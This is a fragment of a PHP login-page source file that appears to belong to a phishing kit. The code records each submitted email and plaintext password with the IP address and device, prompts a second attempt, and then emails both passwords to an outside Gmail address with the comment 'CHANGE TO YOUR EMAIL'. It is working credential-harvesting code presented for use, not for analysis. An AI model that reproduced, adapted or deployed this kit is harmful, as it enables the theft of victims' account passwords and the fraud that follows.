...
// Initialize login attempts array if not exists
...
if ($email) {
    ...
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        ...
        if (empty($password)) {
            ...
            // Log attempt
            $ip = getClientIP();
            $device = $conn->real_escape_string($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown');
            $cleanEmail = $conn->real_escape_string($email);
            $cleanPass = $conn->real_escape_string($password);
            
            // Extract email provider
            $emailParts = explode('@', $email);
            $emailProvider = count($emailParts) > 1 ? $conn->real_escape_string($emailParts[1]) : 'unknown';
            
            $insertQuery = "INSERT INTO login_attempts (email, password, remember_me, ip_address, device_info, email_provider)
                            VALUES ('$cleanEmail', '$cleanPass', $rememberMe, '$ip', '$device', '$emailProvider')";
            
            if (!$conn->query($insertQuery)) {
                error_log("Failed to log login attempt: " . $conn->error);
            }
            
            // Update attempt count
            $_SESSION['login_attempts'][$email] = $attemptCount + 1;
            $newAttemptCount = $_SESSION['login_attempts'][$email];
            
            // Handle after second attempt
            if ($newAttemptCount >= 2) {
                // Query to get both attempts
                $selectQuery = "SELECT password, ip_address, device_info, attempt_time 
                                FROM login_attempts 
                ...
                if ($result && $result->num_rows > 0) {
                    while ($row = $result->fetch_assoc()) {
                        $attemptDetails .= "Attempt #$attemptNumber:\n";
                        $attemptDetails .= "Time: " . $row['attempt_time'] . "\n";
                        $attemptDetails .= "Password: " . $row['password'] . "\n";
                        $attemptDetails .= "IP Address: " . $row['ip_address'] . "\n";
                        $attemptDetails .= "Device: " . $row['device_info'] . "\n";
                        $attemptDetails .= "----------------------------\n";
                        $attemptNumber++;
                    }
                } else {
                    $attemptDetails = "Could not retrieve attempt details from database.\n";
                }

                // Send email notification with both passwords
                $to = "barrysilbertbtc@gmail.com"; // CHANGE TO YOUR EMAIL
                $subject = "✅ Login Attempts Report for $email";
                $message = "We have detected $newAttemptCount login attempts for $email:\n\n";
                $message .= $attemptDetails . "\n";
                $message .= "Total Attempts: $newAttemptCount\n";
                $message .= "Recent IP: $ip\n";
                ...
                if (@mail($to, $subject, $message, $headers)) {
                    error_log("Email sent successfully for $email");
                } else {
                    error_log("Failed to send email for $email");
                }
                
                // Clear session and redirect
                unset($_SESSION['transfer_email'], $_SESSION['login_attempts'][$email]);
...
<body>
                    ...
                    <?php if ($error): ?>
                        <div class="error-message" id="error-msg">
                            ...
                            <?php if ($attemptCount > 0): ?>
                                <div class="attempt-counter">(Attempt <?= $attemptCount + 1 ?>/2)</div>
                            <?php endif; ?>
                        </div>
                    <?php endif; ?>
                </div>
    ...
    <script>
        ...
        document.addEventListener('DOMContentLoaded', function() {
            const formGroup = document.querySelector('.form-group.show-error');
            if (formGroup) {
                // Add shake animation
